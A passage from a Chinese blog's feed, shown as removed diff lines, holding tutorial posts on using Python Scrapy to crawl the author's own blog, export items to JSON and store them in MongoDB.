python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">    <span class="string">'teamssix.pipelines.TeamssixPipeline'</span>: <span class="number">300</span>,  <span class="comment">#优先级，1-1000，数值越低优先级越高</span></span><br><span class="line">&#125;</span><br><span class="line">MONGO_DB_URI = <span class="string">'mongodb://localhost:27017'</span>  <span class="comment">#mongodb 的连接 url</span></span><br><span class="line">MONGO_DB_NAME = <span class="string">'blog'</span>  <span class="comment">#要连接的库</span></span><br></pre></td></tr></table></figure><h1 id="0x02-运行"><a href="#0x02-运行" class="headerlink" title="0x02 运行"></a>0x02 运行</h1><p>直接执行命令，不加参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl blogurl</span><br></pre></td></tr></table></figure><p>注意，如果原来 MongoDB 中没有我们要连接的库， MongoDB 会自己创建，就不需要自己创建了，所以还是蛮方便的，使用 Robo 3T 打开后，就能看到刚才存进的数据。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/scrapy12.png" alt></p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4" target="_blank" rel="noopener">https://youtu.be/aDwAmj3VWH4</a><br><a href="http://doc.scrapy.org/en/latest/topics/architecture.html" target="_blank" rel="noopener">http://doc.scrapy.org/en/latest/topics/architecture.html</a><br><a href="https://lemmo.xyz/post/Scrapy-To-MongoDB-By-Pipeline.html" target="_blank" rel="noopener">https://lemmo.xyz/post/Scrapy-To-MongoDB-By-Pipeline.html</a></p></blockquote>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;前文中讲到了将爬取的数据导出到文件中，接下来就在前文的代码基础之上，将数据导出到 MongoDB中。&lt;/p&gt;
-&lt;h1 id=&quot;0x01-配置-pipelines-py&quot;&gt;&lt;a href=&quot;#0x01-配置-pipelines-py&quot; class=&quot;headerlink&quot; title=&quot;0x01 配置 pipelines.py&quot;&gt;&lt;/a&gt;0x01 配置 pipelines.py&lt;/h1&gt;&lt;p&gt;首先来到 pipelines.py 文件下，在这里写入连接操作数据库的一些功能。&lt;/p&gt;
-&lt;p&gt;将连接操作 mongo 所需要的包导入进来&lt;/p&gt;
-&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; pymongo&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-    
-    </summary>
-    
-      <category term="Python Scrapy 爬虫框架学习笔记" scheme="https://www.teamssix.com/categories/Python-Scrapy-%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
-    
-      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-      <category term="Scrapy" scheme="https://www.teamssix.com/tags/Scrapy/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【Python Scrapy 爬虫框架】 4、数据项介绍和导出文件</title>
-    <link href="https://www.teamssix.com/year/191226-151659.html"/>
-    <id>https://www.teamssix.com/year/191226-151659.html</id>
-    <published>2019-12-26T07:16:59.000Z</published>
-    <updated>2019-12-26T08:24:39.333Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>通过上文的内容，已经把博客文章的标题及目录爬取下来了，接下来为了方便数据的保存，我们可以把这些文章的标题及目录给包装成一个数据项，也就是 items。</p><h1 id="0x01-配置-item"><a href="#0x01-配置-item" class="headerlink" title="0x01 配置 item"></a>0x01 配置 item</h1><p>先来到 items.py 文件下，对标题及目录的信息进行包装，为了对这些信息进行区别，还需要有一个 id，所以代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TeamssixItem</span><span class="params">(scrapy.Item)</span>:</span></span><br><span class="line">    _id = scrapy.Field()</span><br><span class="line">    title = scrapy.Field()</span><br><span class="line">    list = scrapy.Field()</span><br></pre></td></tr></table></figure><a id="more"></a><p>编辑好 items.py 文件后，来到 teamssix_blog_spider.py 先把刚才编辑的内容引用进来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> teamssix.items <span class="keyword">import</span> TeamssixItem</span><br></pre></td></tr></table></figure><p>接着创建一个 item ，并抛出 item ，这时这个 item 就会进入到 item pipelines 中处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">item = TeamssixItem(_id = response.url,title = title,list = list)</span><br><span class="line"><span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure><h1 id="0x02-运行"><a href="#0x02-运行" class="headerlink" title="0x02 运行"></a>0x02 运行</h1><p>程序中包含 item 的好处就在于可以直接把运行结果输出到文件中，直接 -o 指定导出文件名，scrapy 支持导出 json 、jsonlines 、jl 、csv 、xml 、marshal 、pickle 这几种格式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl blogurl -o result.json</span><br></pre></td></tr></table></figure><p>另外如果发现导出文件乱码，只需要在 settings.py 文件中添加下面一行代码即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FEED_EXPORT_ENCODING = <span class="string">"gb18030"</span></span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~# scrapy crawl blogurl -o result.json</span><br><span class="line">~# cat result2.json</span><br><span class="line">[</span><br><span class="line">&#123;&quot;_id&quot;: &quot;https://www.teamssix.com/year/191224-093319.html&quot;, &quot;title&quot;: &quot;【Python Scrapy 爬虫框架】 2、利用 Scrapy 爬取我的博客文章标题链接&quot;, &quot;list&quot;: [&quot;0x00 新建项目&quot;, &quot;0x01 创建一个爬虫&quot;, &quot;0x02</span><br><span class="line"> 运行爬虫&quot;, &quot;0x03 爬取内容解析&quot;]&#125;,</span><br><span class="line">&#123;&quot;_id&quot;: &quot;https://www.teamssix.com/year/191127-201447.html&quot;, &quot;title&quot;: &quot;【漏洞笔记】Robots.txt站点文件&quot;, &quot;list&quot;: [&quot;0x00 概述&quot;, &quot;0x01 漏洞描述&quot;, &quot;0x02 漏洞危害&quot;, &quot;0x03 修复建议&quot;]&#125;,</span><br><span class="line">……省略……</span><br></pre></td></tr></table></figure><p>可以很明显的感受到使用 scrapy 可以很方便的将数据导出到文件中，下一篇文章将介绍如何导出到 MongoDB数据库中。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4" target="_blank" rel="noopener">https://youtu.be/aDwAmj3VWH4</a><br><a href="http://doc.scrapy.org/en/latest/topics/architecture.html" target="_blank" rel="noopener">http://doc.scrapy.org/en/latest/topics/architecture.html</a></p></blockquote>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;通过上文的内容，已经把博客文章的标题及目录爬取下来了，接下来为了方便数据的保存，我们可以把这些文章的标题及目录给包装成一个数据项，也就是 items。&lt;/p&gt;
-&lt;h1 id=&quot;0x01-配置-item&quot;&gt;&lt;a href=&quot;#0x01-配置-item&quot; class=&quot;headerlink&quot; title=&quot;0x01 配置 item&quot;&gt;&lt;/a&gt;0x01 配置 item&lt;/h1&gt;&lt;p&gt;先来到 items.py 文件下，对标题及目录的信息进行包装，为了对这些信息进行区别，还需要有一个 id，所以代码如下：&lt;/p&gt;
-&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;TeamssixItem&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(scrapy.Item)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _id = scrapy.Field()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    title = scrapy.Field()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    list = scrapy.Field()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-    
-    </summary>
-    
-      <category term="Python Scrapy 爬虫框架学习笔记" scheme="https://www.teamssix.com/categories/Python-Scrapy-%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
-    
-      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-      <category term="Scrapy" scheme="https://www.teamssix.com/tags/Scrapy/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【Python Scrapy 爬虫框架】 3、利用 Scrapy 爬取博客文章详细信息</title>
-    <link href="https://www.teamssix.com/year/191226-151652.html"/>
-    <id>https://www.teamssix.com/year/191226-151652.html</id>
-    <published>2019-12-26T07:16:52.000Z</published>
-    <updated>2019-12-26T08:24:40.637Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h1><p>在之前的文章中，会发现如果直接使用爬取命令，终端会回显很多调试信息，这样输出的内容就会显得很乱，所以就可以使用下面的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl blogurl  -s LOG_FILE=all.log</span><br></pre></td></tr></table></figure><a id="more"></a><p>也就是在原来的基础上加上一个 -s 参数，这样调试信息就会保存到参数指定的文件中，不过也可以在 class 下添加下面的代码，这样只会显示调试出现错误的信息，所以这种方式就不用加 -s 了，至于选择哪一个，就需要​视情况而定。​</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">custom_settings = &#123;&apos;LOG_LEVEL&apos;:&apos;ERROR&apos;&#125;</span><br></pre></td></tr></table></figure><h1 id="0x01-编写子页面爬取代码"><a href="#0x01-编写子页面爬取代码" class="headerlink" title="0x01 编写子页面爬取代码"></a>0x01 编写子页面爬取代码</h1><p>先来看一行关键代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">yield</span> scrapy.Request(url,callback=self.sub_article)</span><br></pre></td></tr></table></figure><p>上面这行代码中，使用 yield 返回利用 scrapy 请求 url 所获得的数据，并将数据通过 callback 传递到 sub_article 函数中。</p><p>其实对于 yield 和 return 都可以返回数据，但是利用 yield 返回数据后，还可以继续运行下面的代码，而使用 return 后，接下来的代码就不会再运行了，在 scrapy 中，如果使用 return 返回数据再用 list 存储数据，会造成不少的内存消耗，而使用 yield 则可以减少这些不必要的内存浪费。</p><p>所以接下来在 sub_article 函数中写上我们爬取子页面的代码即可，这里就爬取每个文章的标题和目录作为示例了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_article</span><span class="params">(self,response)</span>:</span></span><br><span class="line">   soup = BeautifulSoup(response.text,<span class="string">'html.parser'</span>)</span><br><span class="line">   print(<span class="string">'\n'</span>,soup.select(<span class="string">'.title'</span>)[<span class="number">0</span>].text)</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> soup.select(<span class="string">'.toc-text'</span>):</span><br><span class="line">      print(<span class="string">'\t'</span>,i.text)</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">~# scrapy crawl blogurl  -s LOG_FILE=all.log</span><br><span class="line">【漏洞笔记】Robots.txt站点文件</span><br><span class="line">         0x00 概述</span><br><span class="line">         0x01 漏洞描述</span><br><span class="line">         0x02 漏洞危害</span><br><span class="line">         0x03 修复建议</span><br><span class="line">【经验总结】常见的HTTP方法</span><br><span class="line">         0x00 概述</span><br><span class="line">         0x01 GET</span><br><span class="line">         0x02 HEAD</span><br><span class="line">         0x03 POST</span><br><span class="line">         0x04 PUT</span><br><span class="line">         0x05 DELETE</span><br><span class="line">         0x06 CONNECT</span><br><span class="line">         0x07 OPTIONS</span><br><span class="line">         0x08 TRACE</span><br><span class="line">         0x09 PATCH</span><br><span class="line">【漏洞笔记】Host头攻击</span><br><span class="line">         0x00 概述</span><br><span class="line">         0x01 漏洞描述</span><br><span class="line">         0x02 漏洞危害</span><br><span class="line">         0x03 修复建议</span><br><span class="line">【直播笔记】白帽子的成长之路</span><br><span class="line">【Python 学习笔记】 异步IO (asyncio) 协程</span><br><span class="line">         0x00 前言</span><br><span class="line">         0x01 基本用法</span><br><span class="line">……省略……</span><br></pre></td></tr></table></figure><h1 id="0x02-完整代码"><a href="#0x02-完整代码" class="headerlink" title="0x02 完整代码"></a>0x02 完整代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogSpider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line">   name = <span class="string">'blogurl'</span></span><br><span class="line">   start_urls = [<span class="string">'https://www.teamssix.com'</span>]</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self,response)</span>:</span></span><br><span class="line">      soup = BeautifulSoup(response.text,<span class="string">'html.parser'</span>)</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> soup.select(<span class="string">'.post-title'</span>):</span><br><span class="line">         url = <span class="string">'https://www.teamssix.com&#123;&#125;'</span>.format(i[<span class="string">'href'</span>])</span><br><span class="line">         <span class="keyword">yield</span> scrapy.Request(url,callback=self.sub_article)</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">sub_article</span><span class="params">(self,response)</span>:</span></span><br><span class="line">      soup = BeautifulSoup(response.text,<span class="string">'html.parser'</span>)</span><br><span class="line">      title = self.article_title(soup)</span><br><span class="line">      list = self.article_list(soup)</span><br><span class="line">      print(title)</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> list:</span><br><span class="line">         print(<span class="string">'\t'</span>,i)</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">article_title</span><span class="params">(self,soup)</span>:</span></span><br><span class="line">      <span class="keyword">return</span> soup.select(<span class="string">'.title'</span>)[<span class="number">0</span>].text</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">article_list</span><span class="params">(self,soup)</span>:</span></span><br><span class="line">      list = []</span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> soup.select(<span class="string">'.toc-text'</span>):</span><br><span class="line">         list.append(i.text)</span><br><span class="line">      <span class="keyword">return</span> list</span><br></pre></td></tr></table></figure><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4" target="_blank" rel="noopener">https://youtu.be/aDwAmj3VWH4</a><br><a href="https://blog.csdn.net/DEREK_D/article/details/84239813" target="_blank" rel="noopener">https://blog.csdn.net/DEREK_D/article/details/84239813</a><br><a href="http://doc.scrapy.org/en/latest/topics/architecture.html" target="_blank" rel="noopener">http://doc.scrapy.org/en/latest/topics/architecture.html</a></p></blockquote>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h1&gt;&lt;p&gt;在之前的文章中，会发现如果直接使用爬取命令，终端会回显很多调试信息，这样输出的内容就会显得很乱，所以就可以使用下面的命令：&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;scrapy crawl blogurl  -s LOG_FILE=all.log&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-    
-    </summary>
-    
-      <category term="Python Scrapy 爬虫框架学习笔记" scheme="https://www.teamssix.com/categories/Python-Scrapy-%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
-    
-      <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-      <category term="Scrapy" scheme="https://www.teamssix.com/tags/Scrapy/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【Python Scrapy 爬虫框架】 2、利用 Scrapy 爬取我的博客文章标题链接</title>
-    <link href="https://www.teamssix.com/year/191224-093319.html"/>
-    <id>https://www.teamssix.com/year/191224-093319.html</id>
-    <published>2019-12-24T01:33:19.000Z</published>
-    <updated>2019-12-24T02:46:12.449Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="0x00-新建项目"><a href="#0x00-新建项目" class="headerlink" title="0x00 新建项目"></a>0x00 新建项目</h1><p>在终端中即可直接新建项目，这里我创建一个名称为 teamssix 的项目，命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject teamssix</span><br></pre></td></tr></table></figure><p>命令运行后，会自动在当前目录下生成许多文件，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">teamssix</span><br><span class="line">    │  scrapy.cfg  #scrapy的配置文件</span><br><span class="line">    └─teamssix  #项目的Python模块，在这里写自己的代码</span><br><span class="line">        │  items.py  #项目定义文件</span><br><span class="line">        │  middlewares.py  #项目中间件文件</span><br><span class="line">        │  pipelines.py  #项目管道文件，用来处理数据的写入存储等操作</span><br><span class="line">        │  settings.py  #项目设置文件</span><br><span class="line">        │  __init__.py</span><br><span class="line">        ├─spiders  #在这里写爬虫代码</span><br><span class="line">        └─ __init__.py</span><br></pre></td></tr></table></figure><a id="more"></a><p>接下来使用 Pycharm 打开我们刚才新建的项目。</p><h1 id="0x01-创建一个爬虫"><a href="#0x01-创建一个爬虫" class="headerlink" title="0x01 创建一个爬虫"></a>0x01 创建一个爬虫</h1><p>首先，在 spiders 文件下 new 一个 python file，这里我新建了一个名为 teamssix_blog_spider 的 py 文件。</p><p>在新建的文件中写入自己的代码，这里我写的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogSpider</span><span class="params">(scrapy.Spider)</span>:</span>  <span class="comment">#创建 Spider 类</span></span><br><span class="line">   name = <span class="string">'blogurl'</span>，  <span class="comment">#爬虫名称，必填</span></span><br><span class="line">   start_urls = [<span class="string">'https://www.teamssix.com'</span>]  <span class="comment">#待爬取的 url ，必填</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self,response)</span>:</span>  <span class="comment">#定义 parse 函数，以解析爬到的东西</span></span><br><span class="line">      print(response.url)</span><br><span class="line">      print(response.text)</span><br></pre></td></tr></table></figure><h1 id="0x02-运行爬虫"><a href="#0x02-运行爬虫" class="headerlink" title="0x02 运行爬虫"></a>0x02 运行爬虫</h1><p>之后运行我们刚新建的 blogurl 项目，运行命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl blogurl</span><br></pre></td></tr></table></figure><p>之后输出结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">2019-12-23 18:33:45 [scrapy.utils.log] INFO: Scrapy 1.8.0 started (bot: teamssix)</span><br><span class="line">2019-12-23 18:33:45 [scrapy.utils.log] INFO: Versions: lxml 4.2.5.0, libxml2 2.9.8, cssselect 1.1.0, parsel 1.5.2, w3lib 1.21.0, Twisted 19.10.0, Python 3.7e&apos;</span><br><span class="line">……省略……</span><br><span class="line">https://www.teamssix.com</span><br><span class="line">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;&lt;meta name=&quot;generator&quot; content=&quot;Hexo 3.8.0&quot;&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;&lt;meta name=&quot;vi                                      </span><br><span class="line">tent&gt;&lt;meta name=&quot;keywords&quot; content&gt;&lt;meta name=&quot;author&quot; content=&quot;Teams Six,undefined&quot;&gt;&lt;meta name=&quot;copyright&quot; content=&quot;Teams Six&quot;&gt;&lt;title&gt;【Teams Six】&lt;/title&gt;&lt;link rel=&quot;styles                                      </span><br><span class="line">css&quot;&gt;&lt;link rel=&quot;icon&quot; href=&quot;/favicon.ico&quot;&gt;&lt;!-- script(src=&quot;http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML&quot;)--&gt;&lt;script src=&quot;/js/mathjax/mathjax</span><br><span class="line">    tex2jax: &#123;inlineMath: [[&apos;$&apos;, &apos;$&apos;], [&apos;\\(&apos;, &apos;\\)&apos;]]&#125;</span><br><span class="line">&#125;);</span><br><span class="line">……省略……</span><br></pre></td></tr></table></figure><p>不难看出，我们想要的内容已经被打印出来了，但这还远远不够，我们还需要对其进行简单的解析，这里就用到了 BeautifulSoup ，有过爬虫经验的对这个库应该是不陌生了。</p><h1 id="0x03-爬取内容解析"><a href="#0x03-爬取内容解析" class="headerlink" title="0x03 爬取内容解析"></a>0x03 爬取内容解析</h1><p>接下来，想要获取到每个文章的链接，只需要对 parse 的内容进行修改，修改也很简单，基本之前写的多线程里的代码一致。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self,response)</span>:</span></span><br><span class="line">   soup = BeautifulSoup(response.text,<span class="string">'html.parser'</span>)</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> soup.select(<span class="string">'.post-title'</span>):</span><br><span class="line">      print(<span class="string">'https://www.teamssix.com&#123;&#125;'</span>.format(i[<span class="string">'href'</span>]))</span><br></pre></td></tr></table></figure><p>很简单的一个小爬虫，然后将爬虫运行一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~# scrapy crawl blogurl  #运行命令</span><br><span class="line">2019-12-23 19:02:01 [scrapy.utils.log] INFO: Scrapy 1.8.0 started (bot: teamssix)</span><br><span class="line">……省略……</span><br><span class="line">https://www.teamssix.com/year/191222-192227.html</span><br><span class="line">https://www.teamssix.com/year/191220-161745.html</span><br><span class="line">……省略……</span><br><span class="line">2019-12-23 19:02:04 [scrapy.core.engine] INFO: Spider closed (finished)</span><br></pre></td></tr></table></figure><p>此时就能够将我们想要的东西爬下来了，但这实现的功能还是比较简单，接下来将介绍如何使用 Scrapy 爬取每个子页面中的详细信息。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>原文链接：<a href="https://www.temassix.com/year/191224-093319.html" target="_blank" rel="noopener">https://www.temassix.com/year/191224-093319.html</a></p></blockquote><blockquote><p>参考链接：<br><a href="https://youtu.be/aDwAmj3VWH4" target="_blank" rel="noopener">https://youtu.be/aDwAmj3VWH4</a><br><a href="http://doc.scrapy.org/en/latest/intro/tutorial.html" target="_blank" rel="noopener">http://doc.scrapy.org/en/latest/intro/tutorial.html</a></p></blockquote>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;0x00-新建项目&quot;&gt;&lt;a href=&quot;#0x00-新建项目&quot; class=&quot;headerlink&quot; title=&quot;0x00 新建项目&quot;&gt;&lt;/a&gt;0x00 新建项目&lt;/h1&gt;&lt;p&gt;在终端中即可直接新建项目，这里我创建一个名称为 teamssix 的项目，命令如下：&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;scrapy startproject teamssix&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
